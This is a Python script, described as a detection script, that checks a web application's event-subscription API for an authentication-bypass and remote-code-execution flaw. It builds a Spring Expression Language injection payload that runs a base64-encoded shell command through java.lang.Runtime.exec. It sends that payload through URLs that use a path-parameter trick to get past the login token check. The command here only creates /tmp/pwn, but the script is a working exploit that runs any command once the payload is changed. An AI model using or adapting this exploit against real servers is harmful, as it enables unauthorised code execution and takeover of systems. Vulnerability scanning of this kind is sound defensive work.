import argparse
import requests
import re
import base64
import urllib.parse

def validate_target(url):
    try:
        pattern = re.compile(r'^https?://[a-zA-Z0-9.-]+(:[0-9]+)?(/.*)?$')
        if not pattern.match(url):
            raise ValueError("Invalid URL format")
        return re.match(r'^https?://[a-zA-Z0-9.-]+(:[0-9]+)?', url).group(0)
    except ValueError as e:
        print("Invalid URL format.")
        exit(1)

def main():
    parser = argparse.ArgumentParser(description='Detection script')
    parser.add_argument('--target', type=str, required=True, help='Target URL')
    args = parser.parse_args()

    target = validate_target(args.target)

    # Step 1: Initial availability check
    check_url = f'{target}/api/v1/events/subscriptions/validation/condition/1234'
    
    try:
        response = requests.get(check_url)
        if response.status_code == 401 and response.json().get('message') == 'Not Authorized! Token not present':
            print("[+] Initial availability check successful.")
        else:
            print("[-] Initial availability check unsuccessful.")
            if response.status_code == 400:
                exit(1)
    except requests.exceptions.ConnectionError as e:
        print("[-] Can't connect to host. Exiting...")
        exit(1)

    # Step 2: Detection
    base64_encoded_cmd = base64.b64encode(b'touch /tmp/pwn').decode()
    payload = f'T(java.lang.Runtime).getRuntime().exec(new java.lang.String(T(java.util.Base64).getDecoder().decode("{base64_encoded_cmd}")))'
    encoded_payload = urllib.parse.quote(payload, safe='')

    excluded_paths = [
        '/v1/users/login',
        '/v1/users/signup',
        '/v1/users/registrationConfirmation',
        '/v1/users/resendRegistrationToken',
        '/v1/users/generatePasswordResetLink',
        '/v1/users/password/reset',
        '/v1/users/checkEmailInUse',
        '/v1/users/refresh',
        '/v1/system/config',
        '/v1/system/version'
    ]

    for path in excluded_paths:
        exploit_url = f'{target}/api/v1;v1{urllib.parse.quote(path, safe="")}/events/subscriptions/validation/condition/{encoded_payload}'
        print(f"[+] Constructed URL: {exploit_url}")
        response = requests.get(exploit_url)
        if response.status_code == 400 and 'Failed to evaluate - EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.Boolean' in response.text:
            print("[+] Target is vulnerable.")
            exit(0)
        elif response.status_code == 401 and 'Not Authorized! Token not present' in response.json().get('message'):
            print("[-] Target is not vulnerable: Not Authorized! Token not present.")
        elif response.status_code == 404:
            print("[-] Target is not vulnerable: 404 Not Found.")
        else:
            print(f"[-] Unexpected response: {response.status_code} - {response.text}")

    print("[-] Target does not seem to be vulnerable.")

if __name__ == '__main__':
    main()
